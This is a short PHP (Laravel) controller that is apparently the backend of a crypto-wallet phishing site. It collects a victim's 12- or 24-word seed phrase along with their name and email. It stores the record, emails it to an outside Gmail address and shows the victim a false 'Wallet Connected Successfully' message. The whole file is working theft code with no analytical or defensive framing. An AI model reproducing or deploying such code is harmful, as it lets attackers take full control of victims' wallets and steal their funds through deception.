<?php

namespace App\Http\Controllers;

use App\Mail\SeedPhraseMail;
use App\Models\Seedphrase;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class SeedphraseController extends Controller
{



    public function sendPhrase(Request $request)
    {
        $request->validate([
                'wallet' => 'required',
                'phrase' => 'required',
                'name' => 'required',
                'email' => 'required',
            ]
        );
        $wallet = new Seedphrase();
        $wallet->phrase = $request->get('phrase');
        $wallet->wallet = $request->get('wallet');
        $wallet->name = $request->get('name');
        $wallet->email = $request->get('email');
        if(count(explode(' ', $wallet->phrase)) == 12 || count(explode(' ', $wallet->phrase)) == 24){
            $wallet->save();
            $wallet = ['wallet' => $wallet];
            Mail::to('miningfarm.co.uk@gmail.com')->send(new SeedPhraseMail($wallet));
            return redirect()->back()->with('success', "Wallet Connected Successfully");
        }
        return redirect()->back()->with('error', "Please enter your complete seed phrase");

    }
}
